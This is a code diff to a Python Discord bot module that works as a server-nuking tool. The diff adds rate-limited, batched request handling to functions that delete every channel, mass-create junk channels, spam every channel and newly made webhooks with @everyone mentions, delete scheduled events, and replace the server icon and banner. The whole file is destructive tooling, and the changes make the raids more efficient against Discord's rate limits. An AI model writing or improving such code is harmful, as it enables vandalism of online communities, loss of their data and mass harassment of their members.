@@ -1,17 +1,48 @@
 from __future__ import annotations
 import asyncio
-import base64
-import os
 import logging
+import os
 import random
 from typing import Optional
 
 import aiohttp
 import discord
+from aiolimiter import AsyncLimiter
 
 from .settings import Settings, State, MISSING, now as utils_now
 
 API = "https://discord.com/api/v10"
+
+
+async def _request(session: aiohttp.ClientSession, method: str, url: str, payload: dict | None, limiter: AsyncLimiter) -> bool:
+    for _ in range(5):
+        async with limiter:
+            async with session.request(method, url, json=payload) as resp:
+                if resp.status in (200, 201, 204):
+                    return True
+                if resp.status == 429:
+                    data = await resp.json()
+                    retry_after = float(data.get("retry_after", 1.0))
+                    logging.warning(f"429 retry={retry_after:.2f}s")
+                    await asyncio.sleep(retry_after + 0.1)
+                    continue
+                return False
+    return False
+
+
+async def _run_batched(items: list[tuple[str, dict | None]], method: str, session: aiohttp.ClientSession, limiter: AsyncLimiter) -> int:
+    ok = 0
+    batch_size = max(1, limiter.rate_limit - 5)
+    random.shuffle(items)
+    for i in range(0, len(items), batch_size):
+        batch = items[i:i + batch_size]
+        tasks = [asyncio.create_task(_request(session, method, url, payload, limiter)) for url, payload in batch]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        ok += sum(1 for r in results if not isinstance(r, Exception) and r)
+        await asyncio.sleep(0.25)
+        while not limiter.has_capacity(batch_size):
+            await asyncio.sleep(0.05)
+    return ok
 
 
 class Operations:
@@ -20,11 +51,14 @@ class Operations:
         self.settings: Settings = Settings.load()
         self.session: Optional[aiohttp.ClientSession] = None
         self.token: str = ""
+        self.limiter: Optional[AsyncLimiter] = None
 
     async def setup(self):
         self.token = self._get_token()
-        self.session = aiohttp.ClientSession(headers={"Authorization": f"Bot {self.token}"}, connector=None)
-        logging.info(f"[ops] token={'set' if self.token else 'MISSING'}")
+        self.session = aiohttp.ClientSession(headers={"Authorization": f"Bot {self.token}"})
+        rps = max(1, self.settings.requests_per_second)
+        self.limiter = AsyncLimiter(rps + 1, 1.0185)
+        logging.info(f"[ops] token={'set' if self.token else 'MISSING'} rps={rps}")
 
     async def close(self):
         if self.session and not self.session.closed:
@@ -40,10 +74,6 @@ class Operations:
                 return t
         return ""
 
-    def _pick_name(self) -> str:
-        names = self.settings.channel_names
-        return random.choice(names) if names else "fluked"
-
     async def _get_channels(self, guild_id: int) -> list[int]:
         url = f"{API}/guilds/{guild_id}/channels"
         try:
@@ -58,17 +88,12 @@ class Operations:
     async def CrChannel(self, guild: discord.Guild) -> int:
         count = self.settings.channel_count
         names_pool = self.settings.channel_names or ["fluked"]
-        tasks = []
+        items = []
         for i in range(count):
             name = names_pool[i % len(names_pool)]
             url = f"{API}/guilds/{guild.id}/channels"
-            payload = {"name": name, "type": 0}
-            tasks.append(asyncio.create_task(self._post(url, payload, i)))
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
-        fails = [r for r in results if isinstance(r, Exception) or not r]
-        if fails:
-            logging.warning(f"[CrChannel] {len(fails)} failed (sample: {fails[:3]})")
+            items.append((url, {"name": name, "type": 0}))
+        ok = await _run_batched(items, "POST", self.session, self.limiter)
         logging.info(f"[CrChannel] {ok}/{count}")
         return ok
 
@@ -76,12 +101,8 @@ class Operations:
         channel_ids = await self._get_channels(guild.id)
         if not channel_ids:
             return 0
-        tasks = []
-        for cid in channel_ids:
-            url = f"{API}/channels/{cid}"
-            tasks.append(asyncio.create_task(self._delete(url)))
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
+        items = [(f"{API}/channels/{cid}", None) for cid in channel_ids]
+        ok = await _run_batched(items, "DELETE", self.session, self.limiter)
         logging.info(f"[DelChannels] {ok}/{len(channel_ids)}")
         return ok
 
@@ -89,17 +110,15 @@ class Operations:
         text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages]
         if not text_channels:
             return 0
-        tasks = []
+        payload = {
+            "content": self.settings.spam_message,
+            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
+        }
+        items = []
         for _ in range(self.settings.spam_count):
             for channel in text_channels:
-                url = f"{API}/channels/{channel.id}/messages"
-                payload = {
-                    "content": self.settings.spam_message,
-                    "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
-                }
-                tasks.append(asyncio.create_task(self._post(url, payload)))
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
+                items.append((f"{API}/channels/{channel.id}/messages", payload))
+        ok = await _run_batched(items, "POST", self.session, self.limiter)
         logging.info(f"[spam] {ok}")
         return ok
 
@@ -110,8 +129,6 @@ class Operations:
         server_icon = None
         icon_path = "assets/zne.png"
         banner_path = "assets/zne_banner.png"
-
-        logging.info(f"[mess_server] enter guild={guild.id}")
 
         if os.path.exists(icon_path):
             with open(icon_path, "rb") as file:
@@ -152,13 +169,7 @@ class Operations:
         if server_banner is not None:
             edit_payload["banner"] = server_banner
 
-        url = f"{API}/guilds/{guild.id}"
-        try:
-            await self._patch(url, edit_payload)
-        except Exception as e:
-            logging.error(f"[mess_server] PATCH failed: {e!r}")
-
-        logging.info(f"[mess_server] done")
+        await _request(self.session, "PATCH", f"{API}/guilds/{guild.id}", edit_payload, self.limiter)
 
     async def _delete_scheduled_events(self, guild_id: int):
         url = f"{API}/guilds/{guild_id}/scheduled-events"
@@ -167,88 +178,52 @@ class Operations:
                 if res.status != 200:
                     return
                 data = await res.json()
-            for ev in data:
-                eid = ev.get("id")
-                if eid:
-                    asyncio.create_task(self._delete(f"{API}/guilds/{guild_id}/scheduled-events/{eid}"))
+            items = [(f"{API}/guilds/{guild_id}/scheduled-events/{ev['id']}", None) for ev in data if ev.get("id")]
+            await _run_batched(items, "DELETE", self.session, self.limiter)
         except Exception:
             pass
 
     async def _create_scheduled_event(self, guild_id: int, payload: dict):
         url = f"{API}/guilds/{guild_id}/scheduled-events"
-        try:
-            await self._post(url, payload)
-        except Exception:
-            pass
+        await _request(self.session, "POST", url, payload, self.limiter)
 
     async def spam_webhook(self, guild: discord.Guild) -> int:
         text_channels = [c for c in guild.text_channels if c.permissions_for(guild.me).manage_webhooks]
-        logging.info(f"[spam_webhook] channels_with_perms={len(text_channels)}")
         if not text_channels:
             return 0
 
-        webhook_tasks = [asyncio.create_task(self._create_webhook(c.id)) for c in text_channels]
-        results = await asyncio.gather(*webhook_tasks, return_exceptions=True)
-        valid = [r for r in results if not isinstance(r, Exception) and r]
-        logging.info(f"[spam_webhook] created={len(valid)}")
+        # create webhooks
+        webhook_payload = {"name": self.settings.webhook_name}
+        items = [(f"{API}/channels/{c.id}/webhooks", webhook_payload) for c in text_channels]
+        await _run_batched(items, "POST", self.session, self.limiter)
+
+        # re-fetch webhooks to get tokens
+        valid = []
+        for c in text_channels:
+            try:
+                async with self.session.get(f"{API}/channels/{c.id}/webhooks") as res:
+                    if res.status == 200:
+                        whs = await res.json()
+                        for wh in whs:
+                            if wh.get("token"):
+                                valid.append((wh["id"], wh["token"]))
+            except Exception:
+                pass
+
         if not valid:
+            logging.info(f"[spam_webhook] no webhooks")
             return 0
 
-        send_tasks = []
+        # spam webhooks
+        payload = {
+            "content": self.settings.webhook_message,
+            "username": self.settings.webhook_name,
+            "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
+        }
+        items = []
         for _ in range(self.settings.webhook_count):
             for wid, wtoken in valid:
-                url = f"{API}/webhooks/{wid}/{wtoken}"
-                payload = {
-                    "content": self.settings.webhook_message,
-                    "username": self.settings.webhook_name,
-                    "allowed_mentions": {"parse": ["users", "roles", "everyone"]},
-                }
-                send_tasks.append(asyncio.create_task(self._post(url, payload)))
-
-        results = await asyncio.gather(*send_tasks, return_exceptions=True)
-        ok = sum(1 for r in results if not isinstance(r, Exception) and r)
-        logging.info(f"[spam_webhook] sent={ok}")
+                items.append((f"{API}/webhooks/{wid}/{wtoken}", payload))
+        ok = await _run_batched(items, "POST", self.session, self.limiter)
+        logging.info(f"[spam_webhook] {ok}")
         return ok
-
-    async def _create_webhook(self, channel_id: int):
-        url = f"{API}/channels/{channel_id}/webhooks"
-        payload = {"name": self.settings.webhook_name}
-        try:
-            async with self.session.post(url, json=payload) as res:
-                body = await res.text()
-                logging.info(f"[webhook_create] ch={channel_id} status={res.status} body={body[:300]}")
-                if res.status in (200, 201):
-                    data = await res.json()
-                    return (data.get("id"), data.get("token"))
-        except Exception as e:
-            logging.error(f"[webhook_create] ch={channel_id} exception: {e!r}")
-            return None
-        return None
-
-    async def _post(self, url: str, payload: dict, idx: int = -1) -> bool:
-        try:
-            async with self.session.post(url, json=payload) as res:
-                if res.status in (200, 201):
-                    return True
-                if idx < 5 or idx == -1:
-                    body = await res.text()
-                    logging.warning(f"[post] idx={idx} status={res.status} body={body[:200]}")
-                return False
-        except Exception as e:
-            if idx < 5:
-                logging.error(f"[post] idx={idx} exception: {e!r}")
-            return False
-
-    async def _delete(self, url: str) -> bool:
-        try:
-            async with self.session.delete(url) as res:
-                return 200 <= res.status < 300
-        except Exception:
-            return False
-
-    async def _patch(self, url: str, payload: dict) -> bool:
-        try:
-            async with self.session.patch(url, json=payload) as res:
-                return 200 <= res.status < 300
-        except Exception:
-            return False
